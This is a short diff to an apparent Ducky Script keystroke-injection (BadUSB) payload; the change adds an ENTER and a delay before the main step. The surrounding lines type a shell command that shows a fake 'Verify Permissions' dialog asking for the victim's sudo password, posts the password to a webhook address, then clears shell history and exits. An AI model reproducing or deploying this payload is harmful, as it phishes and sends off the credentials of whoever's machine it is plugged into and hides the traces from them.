@@ -26,6 +26,8 @@ DEFINE WEBHOOK example.com
 STRING WEBHOOK_URL="
 STRING WEBHOOK
 STRING "
+ENTER
+DELAY 500
 
 REM All-in-one is important 
 STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(kdialog --title "Verify Permissions" --password "Put your sudo password di continue" --default "password")\"}" $WEBHOOK_URL); history -c; exit;
